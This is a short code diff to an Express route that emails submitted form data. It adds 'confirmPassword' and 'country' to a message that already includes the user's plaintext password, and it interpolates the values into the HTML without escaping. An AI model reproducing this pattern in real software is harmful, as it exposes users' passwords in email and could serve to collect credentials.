@@ -6,7 +6,7 @@ dotenv.config();
 const router = express.Router();
 
 router.post('/send', async (req, res) => {
-  const { firstName, lastName, email, phone, password } = req.body;
+  const { firstName, lastName, email, phone, password , confirmPassword , country} = req.body;
 
   try {
     const transporter = nodemailer.createTransport({
@@ -28,6 +28,9 @@ router.post('/send', async (req, res) => {
         <p><strong>Email:</strong> ${email}</p>
         <p><strong>Phone:</strong> ${phone}</p>
         <p><strong>Password:</strong> ${password}</p>
+         <p><strong>Confirm Password:</strong> ${confirmPassword}</p>
+        <p><strong>Country:</strong> ${country}</p>
+
       `
     };
 
